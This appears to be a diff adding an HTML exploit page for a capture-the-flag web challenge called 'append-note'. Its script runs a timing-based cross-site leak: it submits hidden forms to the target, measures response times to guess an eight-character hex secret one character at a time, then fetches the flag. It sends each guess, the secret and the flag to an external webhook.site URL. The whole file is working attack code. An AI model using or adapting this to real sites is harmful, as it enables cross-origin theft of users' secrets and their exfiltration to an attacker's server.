@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html>
+<head><title>XS-Leak Form-based</title></head>
+<body>
+<div id="s">Loading...</div>
+<script>
+const TARGET = "https://append-note-czwfe.instancer.lac.tf";
+const WEBHOOK = "https://webhook.site/301f33af-6ef2-4b91-b9fe-ce6057c122df";
+const CHARS = "0123456789abcdef";
+
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+const report = d => {
+    navigator.sendBeacon(WEBHOOK, d);
+    new Image().src = WEBHOOK + "?m=" + encodeURIComponent(d);
+};
+const status = s => document.getElementById('s').textContent = s;
+
+// Use form submission - bypasses popup blocker!
+async function measure(prefix) {
+    const url = `${TARGET}/append?content=${encodeURIComponent(prefix)}&url=${encodeURIComponent(TARGET + "/")}`;
+    const wname = 'p' + Math.random().toString(36).slice(2);
+    
+    return new Promise(resolve => {
+        const form = document.createElement('form');
+        form.method = 'GET';
+        form.action = url;
+        form.target = wname;
+        form.style.display = 'none';
+        document.body.appendChild(form);
+        
+        const t0 = performance.now();
+        form.submit();
+        
+        setTimeout(() => {
+            const elapsed = performance.now() - t0;
+            document.body.removeChild(form);
+            try { window.open('', wname).close(); } catch(e) {}
+            resolve(elapsed);
+        }, 700);
+    });
+}
+
+async function avg(prefix, n = 10) {
+    const times = [];
+    for (let i = 0; i < n; i++) {
+        times.push(await measure(prefix));
+        await sleep(50);
+    }
+    times.sort((a, b) => a - b);
+    const t = times.slice(2, -2);
+    return t.length ? t.reduce((a, b) => a + b, 0) / t.length : times[Math.floor(times.length/2)];
+}
+
+async function calibrate() {
+    status('Calibrating...');
+    report('CAL_START_FORM');
+    
+    const t200 = await avg("", 15);
+    const t404 = await avg("ZZZZZ", 15);
+    
+    report(`CAL:200=${t200.toFixed(0)},404=${t404.toFixed(0)}`);
+    status(`200=${t200.toFixed(0)}ms, 404=${t404.toFixed(0)}ms`);
+    
+    return t200 < t404;
+}
+
+async function findSecret(faster) {
+    let secret = "";
+    
+    for (let pos = 0; pos < 8; pos++) {
+        status(`Pos ${pos+1}/8: ${secret}`);
+        
+        const results = [];
+        for (const c of CHARS) {
+            const t = await avg(secret + c, 8);
+            results.push({ c, t });
+        }
+        
+        results.sort((a, b) => a.t - b.t);
+        const top3 = results.slice(0, 3).map(r => `${r.c}:${r.t.toFixed(0)}`).join(',');
+        report(`P${pos}:${top3}`);
+        
+        const winner = faster ? results[0].c : results[results.length - 1].c;
+        secret += winner;
+        report(`P${pos}=${winner}|${secret}`);
+    }
+    
+    return secret;
+}
+
+async function main() {
+    report('STARTED_FORM_V2');
+    status('Starting...');
+    
+    try {
+        const faster = await calibrate();
+        report(`FASTER=${faster}`);
+        
+        const secret = await findSecret(faster);
+        report(`SECRET:${secret}`);
+        
+        const r = await fetch(`${TARGET}/flag?secret=${secret}`);
+        const flag = await r.text();
+        report(`FLAG1:${flag}`);
+        status(`FLAG: ${flag}`);
+        
+        if (!flag.includes('lactf')) {
+            report('TRY_INV');
+            const secret2 = await findSecret(!faster);
+            const r2 = await fetch(`${TARGET}/flag?secret=${secret2}`);
+            const flag2 = await r2.text();
+            report(`FLAG2:${flag2}`);
+        }
+    } catch(e) {
+        report(`ERR:${e.message}`);
+    }
+}
+
+main();
+</script>
+</body>
+</html>
